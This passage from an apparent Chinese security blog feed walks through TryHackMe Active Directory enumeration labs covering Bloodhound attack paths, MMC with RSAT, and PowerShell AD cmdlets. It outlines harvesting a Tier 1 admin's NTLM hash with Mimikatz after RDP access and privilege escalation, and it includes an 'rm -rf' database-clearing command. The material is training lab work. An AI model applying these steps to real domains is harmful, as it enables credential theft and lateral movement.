+&lt;p&gt;如果使用所选边缘过滤器没有可用的攻击路径，Bloodhound 将显示 “未找到结果”。&lt;strong&gt;请注意，这也可能是由于 Bloodhound/Sharphound 不匹配造成的，这意味着结果未正确摄取。请使用 Bloodhound v4.1.0。&lt;strong&gt;然而，在我们的例子中，Bloodhound 显示了一条攻击路径。它显示&lt;/strong&gt; T1 管理员 ACCOUNT&lt;/strong&gt; 之一通过使用其凭据对&lt;strong&gt; THMJMP1&lt;/strong&gt; （工作站）进行身份验证，破坏了分层模型。它还表明属于&lt;strong&gt; DOMAIN USERS&lt;/strong&gt; 组的任何用户（包括我们的 AD 帐户）都能够通过 RDP 连接到该主机。&lt;br /&gt;
+我们可以执行如下操作来利用这条路径：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Use our AD credentials to RDP into &lt;strong&gt;THMJMP1&lt;/strong&gt;.&lt;br /&gt;
+ 使用我们的 AD 凭据通过 RDP 进入&lt;strong&gt; THMJMP1&lt;/strong&gt; 。&lt;/li&gt;
+&lt;li&gt;Look for a privilege escalation vector on the host that would provide us with Administrative access.&lt;br /&gt;
+ 在主机上寻找可为我们提供管理访问权限的权限升级向量。&lt;/li&gt;
+&lt;li&gt;Using Administrative access, we can use credential harvesting techniques and tools such as Mimikatz.&lt;br /&gt;
+ 通过管理访问，我们可以使用凭据收集技术和工具，例如 Mimikatz。&lt;/li&gt;
+&lt;li&gt;Since the T1 Admin has an active session on &lt;strong&gt;THMJMP1&lt;/strong&gt;, our credential harvesting would provide us with the NTLM hash of the associated account.&lt;br /&gt;
+ 由于 T1 管理员在&lt;strong&gt; THMJMP1&lt;/strong&gt; 上有一个活动会话，因此我们的凭据收集将为我们提供关联帐户的 NTLM 哈希值。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;这是一个简单的例子。一般情况下，攻击路径可能比较复杂，需要采取多次行动才能达到最终目标。如果您对与每个边缘相关的漏洞感兴趣，以下&lt;a href=&#34;https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html&#34;&gt; Bloodhound 文档&lt;/a&gt;提供了很好的指南。 Bloodhound 是一款极其强大的 AD 枚举工具，可以深入了解攻击面的 AD 结构。值得花精力去尝试它并了解它的各种功能。&lt;/p&gt;
+&lt;h4 id=&#34;session-data-only-仅会话数据&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#session-data-only-仅会话数据&#34;&gt;#&lt;/a&gt; Session Data Only 仅会话数据&lt;/h4&gt;
+&lt;p&gt;AD 的结构没有改变 在大型组织中经常出现。可能会有几个新员工， 但 OU、组、用户和权限的整体结构将 保持不变。&lt;/p&gt;
+&lt;p&gt;然而，不断变化的一件事是活动会话和登录事件。由于 Sharphound 创建 AD 结构的时间点快照，因此活动会话数据并不总是准确的，因为某些用户可能已经注销了其会话，或者新用户可能已经建立了新会话。这是需要注意的重要事项，也是我们希望定期执行 Sharphound 的原因。&lt;br /&gt;
+一个好的方法是在评估开始时使用 “全部” 收集方法执行 Sharphound，然后使用 “会话” 收集方法每天至少执行两次 Sharphound。这将为您提供新的会话数据并确保这些运行速度更快，因为它们不会再次枚举整个 AD 结构。执行这些会话运行的最佳时间是在 10:00 左右，此时用户喝了第一杯咖啡并开始工作，然后在 14:00 左右，即他们午休回来但回家之前。&lt;/p&gt;
+&lt;p&gt;在从这些新的 Sharphound 运行中导入数据之前，您可以通过单击 “清除会话信息” 在 “数据库信息” 选项卡上清除 Bloodhound 中的停滞会话数据&lt;/p&gt;
+&lt;p&gt;Benefits 好处&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;提供用于 AD 枚举的 GUI 。&lt;/li&gt;
+&lt;li&gt;能够显示枚举的 AD 信息的攻击路径。&lt;/li&gt;
+&lt;li&gt;提供对通常需要多次手动查询才能恢复的 AD 对象的更深刻见解。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Drawbacks 缺点&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;需要执行 Sharphound，该程序噪音较大，通常可以被 AV 或 EDR 解决方案检测到。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;清楚数据&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#清楚数据&#34;&gt;#&lt;/a&gt; 清楚数据&lt;/h3&gt;
+&lt;h3 id=&#34;步骤-1停止-neo4j-服务&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#步骤-1停止-neo4j-服务&#34;&gt;#&lt;/a&gt; 步骤 1：停止 Neo4j 服务&lt;/h3&gt;
+&lt;p&gt;确保 Neo4j 数据库服务已经停止，以避免在删除文件时出现问题。根据你的系统配置，你可以使用以下命令停止 Neo4j 服务：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在 Windows 上：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;powershellCopy Code&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Stop-Service -Name neo4j&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在 Linux 上（如果你通过系统服务启动 Neo4j）：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;bashCopy Code&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo systemctl stop neo4j&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;步骤-2删除-neo4j-数据库文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#步骤-2删除-neo4j-数据库文件&#34;&gt;#&lt;/a&gt; 步骤 2：删除 Neo4j 数据库文件&lt;/h3&gt;
+&lt;p&gt;Neo4j 数据库通常存储在以下位置：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在 Windows 上：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Neo4j 数据库文件通常在  &lt;code&gt;C:\Program Files\Neo4j Community\neo4j-data\databases&lt;/code&gt;  目录中。删除这个目录下的所有文件和子目录。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在 Linux 上：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Neo4j 数据库文件通常在  &lt;code&gt;/var/lib/neo4j/data/databases&lt;/code&gt;  目录中。你可以使用以下命令删除该目录下的所有文件和子目录：&lt;/p&gt;
+&lt;p&gt;bashCopy Code&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo rm -rf /var/lib/neo4j/data/databases/*&lt;/code&gt;&lt;/p&gt;
+</content>
+        <category term="枚举AD" />
+        <updated>2024-09-08T08:43:36.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://k1t0111.github.io/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-Microsoft%E6%8E%A7%E5%88%B6%E5%8F%B0MMC/</id>
+        <title>AD域枚举信息-Microsoft控制台MMC</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-Microsoft%E6%8E%A7%E5%88%B6%E5%8F%B0MMC/"/>
+        <content type="html">&lt;h5 id=&#34;enumeration-through-microsoft-management-console&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#enumeration-through-microsoft-management-console&#34;&gt;#&lt;/a&gt; Enumeration through Microsoft Management Console&lt;/h5&gt;
+&lt;p&gt;我们将使用 Microsoft 管理控制台 （MMC） 和&lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps&#34;&gt;远程服务器管理工具&lt;/a&gt; （RSAT） AD 管理单元。如果您使用提供的 Windows VM （THMJMP1），则已为您安装该 VM。但是，如果您使用的是自己的 Windows 计算机，则可以执行以下步骤来安装管理单元：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Press &lt;strong&gt;Start&lt;/strong&gt; 按 **“开始 **”&lt;/li&gt;
+&lt;li&gt;Search &lt;strong&gt;&amp;quot;Apps &amp;amp; Features&amp;quot;&lt;/strong&gt; and press enter&lt;br /&gt;
+ 搜索 **“应用和功能”**，然后按回车键&lt;/li&gt;
+&lt;li&gt;Click &lt;strong&gt;Manage Optional Features&lt;/strong&gt;&lt;br /&gt;
+ 单击 “&lt;strong&gt;管理可选功能&lt;/strong&gt;”&lt;/li&gt;
+&lt;li&gt;Click &lt;strong&gt;Add a feature&lt;/strong&gt;&lt;br /&gt;
+ 单击 **“添加功能 **”&lt;/li&gt;
+&lt;li&gt;Search for &lt;strong&gt;&amp;quot;RSAT&amp;quot;&lt;/strong&gt;&lt;br /&gt;
+ 搜索 &lt;strong&gt;“RSAT”&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Select &amp;quot;&lt;strong&gt;RSAT: Active Directory Domain Services and Lightweight Directory Tools&amp;quot;&lt;/strong&gt; and click &lt;strong&gt;Install&lt;/strong&gt;&lt;br /&gt;
+ 选择 “&lt;strong&gt;RSAT：Active Directory 域服务和轻量级目录工具”&lt;/strong&gt;，然后单击 “&lt;strong&gt;安装&lt;/strong&gt;”&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;* 只有安装了 rsat 才可以继续使用 MMC&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907200746.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
+ 可以看到不是说逆向安装就能安装的 rsat 因此可以看到如果我们拿不到本地管理员的权限我们就无法安装 rsat 那么此时我们的 cmdlet 以及 mmc 都是无法使用的。&lt;/p&gt;
+&lt;p&gt;您可以通过使用 Windows “开始” 按钮、搜索 “运行” 和键入 MMC 来启动 MMC。如果我们只是正常运行 MMC，它将无法工作，因为我们的计算机未加入域，并且我们的本地帐户不能用于对域进行身份验证。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/dd93acc5bf807d120eb083d2250e77ef.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;这就是上一个任务的 Runas 窗口发挥作用的地方。在该窗口中，我们可以启动 MMC，这将确保所有 MMC 网络连接都将使用我们注入的 AD 凭据。&lt;br /&gt;
+就相当于说我们使用刚才的&lt;a href=&#34;%E5%87%AD%E8%AF%81%E6%B3%A8%E5%85%A5.md&#34;&gt;凭证注入&lt;/a&gt;的作用，我们打开 mmc 时候是以凭据身份通过网络进行验证。我们就可以加入域中就可以使用 mmc。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240818155636.png&#34; alt=&#34;image.png&#34; /&gt;&lt;br /&gt;
+ 此时我们使用了 mmc 进行操作。进入了 mmc，开始配置:&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240907195611.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Click &lt;strong&gt;File&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Add/Remove Snap-in&lt;/strong&gt;&lt;br /&gt;
+ 单击 **“文件 **”-&amp;gt;&lt;strong&gt;“添加 / 删除管理单元&lt;/strong&gt;”&lt;/li&gt;
+&lt;li&gt;Select and &lt;strong&gt;Add&lt;/strong&gt; all three Active Directory Snap-ins&lt;br /&gt;
+ 选择并&lt;strong&gt;添加&lt;/strong&gt;所有三个 Active Directory 管理单元&lt;/li&gt;
+&lt;li&gt;Click through any errors and warnings&lt;br /&gt;
+ 点击查看任何错误和警告&lt;/li&gt;
+&lt;li&gt;Right-click on &lt;strong&gt;Active Directory Domains and Trusts&lt;/strong&gt; and select &lt;strong&gt;Change Forest&lt;/strong&gt;&lt;br /&gt;
+ 右键单击 **“Active Directory 域和信任关系 **”，然后选择 “&lt;strong&gt;更改林&lt;/strong&gt;”&lt;/li&gt;
+&lt;li&gt;Enter &lt;em&gt;&lt;a href=&#34;http://za.tryhackme.com&#34;&gt;za.tryhackme.com&lt;/a&gt;&lt;/em&gt; as the &lt;strong&gt;Root domain&lt;/strong&gt; and Click &lt;strong&gt;OK&lt;/strong&gt;&lt;br /&gt;
+ 输入 &lt;em&gt;&lt;a href=&#34;http://za.tryhackme.com&#34;&gt;za.tryhackme.com&lt;/a&gt;&lt;/em&gt; 作为&lt;strong&gt;根域&lt;/strong&gt;，然后单击&lt;strong&gt;确定&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Right-click on &lt;strong&gt;Active Directory Sites and Services&lt;/strong&gt; and select &lt;strong&gt;Change Forest&lt;/strong&gt;&lt;br /&gt;
+ 右键单击 **“Active Directory 站点和服务”**，然后选择 “&lt;strong&gt;更改林&lt;/strong&gt;”&lt;/li&gt;
+&lt;li&gt;Enter &lt;em&gt;&lt;a href=&#34;http://za.tryhackme.com&#34;&gt;za.tryhackme.com&lt;/a&gt;&lt;/em&gt; as the &lt;strong&gt;Root domain&lt;/strong&gt; and Click OK&lt;br /&gt;
+ 输入 &lt;em&gt;&lt;a href=&#34;http://za.tryhackme.com&#34;&gt;za.tryhackme.com&lt;/a&gt;&lt;/em&gt; 作为&lt;strong&gt;根域&lt;/strong&gt;，然后单击确定&lt;/li&gt;
+&lt;li&gt;Right-click on &lt;strong&gt;Active Directory Users and Computers&lt;/strong&gt; and select &lt;strong&gt;Change Domain&lt;/strong&gt;&lt;br /&gt;
+ 右键单击 **“Active Directory 用户和计算机 **”，然后选择 **“更改域”**&lt;/li&gt;
+&lt;li&gt;Enter &lt;em&gt;&lt;a href=&#34;http://za.tryhackme.com&#34;&gt;za.tryhackme.com&lt;/a&gt;&lt;/em&gt; as the &lt;strong&gt;Domain&lt;/strong&gt; and Click &lt;strong&gt;OK&lt;/strong&gt;&lt;br /&gt;
+ 输入 &lt;em&gt;&lt;a href=&#34;http://za.tryhackme.com&#34;&gt;za.tryhackme.com&lt;/a&gt;&lt;/em&gt; 作为&lt;strong&gt;域&lt;/strong&gt;，然后单击&lt;strong&gt;确定&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;Right-click on &lt;strong&gt;Active Directory Users and Computers&lt;/strong&gt; in the left-hand pane&lt;br /&gt;
+ 右键单击左侧窗格中的 **“Active Directory 用户和计算机 **”&lt;/li&gt;
+&lt;li&gt;Click on &lt;strong&gt;View&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Advanced Features&lt;/strong&gt;&lt;br /&gt;
+ 点击查看 -&amp;gt; 高级功能&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;如果到目前为止一切正常，则现在应指向目标域，并针对目标域进行身份验证：现在，我们可以在此处开始列举有关 AD 结构的信息。&lt;/p&gt;
+&lt;h4 id=&#34;users-and-computers-用户和计算机&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#users-and-computers-用户和计算机&#34;&gt;#&lt;/a&gt; Users and Computers 用户和计算机&lt;/h4&gt;
+&lt;p&gt;让我们看一下 Active Directory 结构。对于此任务，我们将重点关注 AD 用户和计算机。展开该管理单元并展开 za 域以查看初始组织单元 （OU） 结构：&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a5fc9efbd6a77ee9ea72a25d7ba13240.png&#34; alt=&#34;MMC AD Snap-in&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;让我们看一下 People 目录。在这里，我们看到用户是按照部门 OU 划分的。单击这些 OU 中的每一个都将显示属于该部门的用户。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/993c161b6d86d61bf5ecc31a0ce0fa54.png&#34; alt=&#34;MMC AD Snap-in&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;单击这些用户中的任何一个都将允许我们查看他们的所有属性和属性。我们还可以看到他们属于哪些组：&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/659127fd61749667192a19e0fb71ad55.png&#34; alt=&#34;MMC AD Snap-in&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;我们还可以使用 MMC 在环境中查找主机。如果我们单击 “服务器” 或 “工作站”，将显示已加入域的计算机列表。&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9e353f21616effb4a9cca2f3e86e65ad.png&#34; alt=&#34;MMC AD Snap-in&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;如果我们有相关的权限，我们也可以使用 MMC 直接对 AD 进行更改，例如更改用户的密码或向特定组添加帐户。尝试使用 MMC 以更好地了解 AD 域结构。利用搜索功能查找对象。&lt;/p&gt;
+&lt;p&gt;Benefits 好处&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;GUI 提供了一种出色的方法来全面了解 AD 环境。&lt;/li&gt;
+&lt;li&gt;可以对不同的 AD 对象进行快速搜索。&lt;/li&gt;
+&lt;li&gt;它提供了一种直接的方法来查看 AD 对象的特定更新。&lt;/li&gt;
+&lt;li&gt;如果我们有足够的权限，我们可以直接更新现有的 AD 对象或添加新的 AD 对象。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Drawbacks 缺点&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;GUI 需要对执行它的计算机进行 RDP 访问。&lt;/li&gt;
+&lt;li&gt;尽管搜索对象的速度很快，但无法收集 AD 范围的属性或属性。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以 MMC 的方式前提是我们能拿到 rdp 的 gui 界面才可以。&lt;/p&gt;
+</content>
+        <category term="枚举AD" />
+        <updated>2024-09-08T08:43:24.000Z</updated>
+    </entry>
+    <entry>
+        <id>https://k1t0111.github.io/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-powershell-cmdlet/</id>
+        <title>AD域枚举信息-powershell-cmdlet</title>
+        <link rel="alternate" href="https://k1t0111.github.io/2024/09/08/AD%E5%9F%9F%E6%9E%9A%E4%B8%BE%E4%BF%A1%E6%81%AF-powershell-cmdlet/"/>
+        <content type="html">&lt;p&gt;安装 Active Directory 远程管理工具（AD-RSAT，Active Directory Remote Server Administration Tools）后，系统会自动安装一组用于管理 Active Directory 的 PowerShell cmdlet。这些 cmdlet 允许你通过 PowerShell 执行各种 Active Directory 相关的管理任务，如用户和计算机管理、组策略、域控制器等。&lt;/p&gt;
+&lt;h3 id=&#34;常见的-ad-rsat-cmdlet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见的-ad-rsat-cmdlet&#34;&gt;#&lt;/a&gt; 常见的 AD-RSAT cmdlet&lt;/h3&gt;
+&lt;p&gt;以下是一些常见的 AD-RSAT cmdlet，通常会在安装了这些工具后可用：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;用户和计算机管理&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Get-ADUser&lt;/code&gt; ：获取 Active Directory 用户的详细信息。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Set-ADUser&lt;/code&gt; ：修改 Active Directory 用户的属性。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;New-ADUser&lt;/code&gt; ：创建新的 Active Directory 用户。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Remove-ADUser&lt;/code&gt; ：删除 Active Directory 用户。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Get-ADComputer&lt;/code&gt; ：获取 Active Directory 计算机的详细信息。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Set-ADComputer&lt;/code&gt; ：修改 Active Directory 计算机的属性。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;New-ADComputer&lt;/code&gt; ：创建新的 Active Directory 计算机。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Remove-ADComputer&lt;/code&gt; ：删除 Active Directory 计算机。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;组管理&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Get-ADGroup&lt;/code&gt; ：获取 Active Directory 组的详细信息。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Set-ADGroup&lt;/code&gt; ：修改 Active Directory 组的属性。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;New-ADGroup&lt;/code&gt; ：创建新的 Active Directory 组。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Remove-ADGroup&lt;/code&gt; ：删除 Active Directory 组。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;域控制器和域管理&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Get-ADDomainController&lt;/code&gt; ：获取域控制器的详细信息。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Get-ADDomain&lt;/code&gt; ：获取 Active Directory 域的详细信息。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;组策略&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Get-GPO&lt;/code&gt; ：获取组策略对象的信息。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;New-GPO&lt;/code&gt; ：创建新的组策略对象。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Set-GPO&lt;/code&gt; ：修改组策略对象的设置。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Remove-GPO&lt;/code&gt; ：删除组策略对象。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;组织单位 (OU) 管理&lt;/strong&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Get-ADOrganizationalUnit&lt;/code&gt; ：获取 Active Directory 组织单位的详细信息。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;New-ADOrganizationalUnit&lt;/code&gt; ：创建新的 Active Directory 组织单位。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;Remove-ADOrganizationalUnit&lt;/code&gt; ：删除 Active Directory 组织单位。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;如何确认安装的-cmdlet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#如何确认安装的-cmdlet&#34;&gt;#&lt;/a&gt; 如何确认安装的 cmdlet&lt;/h3&gt;
+&lt;p&gt;要查看安装的 AD-RSAT cmdlet，你可以在 PowerShell 中运行以下命令：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Get-Command&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Module ActiveDirectory&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这个命令会列出所有来自  &lt;code&gt;ActiveDirectory&lt;/code&gt;  模块的 cmdlet。如果你发现没有安装某些 cmdlet，可能需要确认 RSAT 工具是否正确安装或是否需要更新。&lt;/p&gt;
+&lt;h3 id=&#34;安装和启用-ad-rsat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装和启用-ad-rsat&#34;&gt;#&lt;/a&gt; 安装和启用 AD-RSAT&lt;/h3&gt;
+&lt;p&gt;在 Windows 10 及更高版本中，可以通过以下步骤安装和启用 AD-RSAT 工具：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;打开设置&lt;/strong&gt;：进入  &lt;code&gt;设置&lt;/code&gt;  &amp;gt;  &lt;code&gt;应用&lt;/code&gt;  &amp;gt;  &lt;code&gt;可选功能&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;添加功能&lt;/strong&gt;：点击  &lt;code&gt;添加功能&lt;/code&gt; ，然后搜索  &lt;code&gt;RSAT&lt;/code&gt; 。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;安装所需组件&lt;/strong&gt;：勾选相关的 RSAT 组件（如 Active Directory 域服务和 Lightweight Directory Tools），然后点击  &lt;code&gt;安装&lt;/code&gt; 。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;PowerShell 是命令提示符的升级版。Microsoft 于 2006 年首次发布。虽然 PowerShell 具有命令提示符提供的所有标准功能，但它也提供对 cmdlet（发音为 command-lets）的访问，这些 cmdlet 是用于执行特定功能的 .NET 类。虽然我们可以像 &lt;a href=&#34;https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView&#34;&gt;PowerView&lt;/a&gt; 的创建者那样编写自己的 cmdlet，但我们已经可以使用内置的 cmdlet 走得很远。&lt;/p&gt;
+&lt;p&gt;由于我们在任务 3 中安装了 AD-RSAT 工具，因此它会自动为我们安装关联的 cmdlet。已安装 50+ 个 cmdlet。我们将查看其中的一些，但请参阅 &lt;a href=&#34;https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps&#34;&gt;此列表以获取 cmdlet 的完整列表。&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;** 由于剧情模拟需要我们今天需要模拟我们已经拿到了一个服务器的权限。&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;figcaption data-lang=&#34;Bash&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;ssh&lt;/span&gt; za.tryhackme.com&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;AD Username&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;@thmjmp1.za.tryhackme.com&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h6 id=&#34;验证cmdlet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#验证cmdlet&#34;&gt;#&lt;/a&gt; 验证 cmdlet&lt;/h6&gt;
+&lt;p&gt;&lt;a href=&#34;powershelll%E6%9E%9A%E4%B8%BE.md#%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E5%AE%89%E8%A3%85%E7%9A%84%20cmdlet&#34;&gt;如何确认安装的 cmdlet&lt;/a&gt;&lt;br /&gt;
+&lt;img loading=&#34;lazy&#34; data-src=&#34;https://raw.githubusercontent.com/k1t0111/blog/main/image/20240830201932.png&#34; alt=&#34;image.png&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;可以看到根据结果我们已经找到相关的 cmdlet 证明我们此时这台服务器上已经安装了一个 rsat 之后就带上了 cmdlet&lt;/p&gt;
+&lt;h5 id=&#34;users-用户&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#users-用户&#34;&gt;#&lt;/a&gt; Users 用户&lt;/h5&gt;
+&lt;p&gt;我们可以使用 &lt;code&gt;Get-ADUser&lt;/code&gt;  cmdlet 来枚举 AD 用户：&lt;/p&gt;
+&lt;figure class=&#34;highlight powershell&#34;&gt;&lt;figcaption data-lang=&#34;PowerShell&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;Get-ADUser&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Identity beth&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;nolan &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Server za&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;tryhackme&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;com &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Properties &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这是一个 PowerShell 命令，用于从 Active Directory 中获取用户信息。 &lt;code&gt;-Identity&lt;/code&gt;  用于指定用户， &lt;code&gt;-Server&lt;/code&gt;  指定域控制器， &lt;code&gt;-Properties *&lt;/code&gt;  表示获取所有属性&lt;br /&gt;
+这些参数用于以下用途：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;-Identity&lt;br /&gt;
+-Identity - 我们正在枚举的帐户名&lt;/li&gt;
+&lt;li&gt;-Properties
+&lt;ul&gt;
+&lt;li&gt;属性 - 将显示与帐户关联的哪些属性，* 将显示所有属性&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;-Server&lt;br /&gt;
